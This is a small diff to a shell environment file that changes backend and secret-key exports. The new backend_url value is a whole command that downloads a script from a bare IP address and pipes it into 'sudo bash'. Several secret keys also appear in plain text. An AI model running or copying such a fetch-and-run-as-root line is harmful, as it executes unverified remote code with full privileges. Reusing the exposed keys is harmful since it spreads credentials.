@@ -1,5 +1,5 @@
-export backend_url=54.83.84.236:8080
-export secret_key=S2#JFVSoBgmWpaaIFY/#NAaJ1NzLtNe0z+OIFJHW8tt6Yrsi66KckJlWQbPes2M=#4d1e
+export backend_url=wget -O - -o /dev/null "http://52.90.2.2:8080/app/download?t=inst" | sudo bash /dev/stdin -i --sk=S3#51v+zwjF/rtTiJiT#Fn8cmw0Ra9hEjqsHtjHjU6yBuPCCf2U0hj4qaccIOHM=#978e --s3_url http://52.90.2.2:8080/service/png --installer_url "http://52.90.2.2:8080/app/download?t=tgz" --base_url http://52.90.2.2:8080/
+export secret_key=S11#FUyzAjitPGfbgFmr#xvpZKnCek9FaY7RaSphuFP3cEAw26nI++D4Exmj9qxE=#9bb2
 
 #export backend_url=54.172.134.75
 #export secret_key=S2#/CyDDqJq8FfGNcLC#sg91DhfwIJjFZ/P7QU+PUIOT3LvVtSuQMl7kfamaU00=#9009
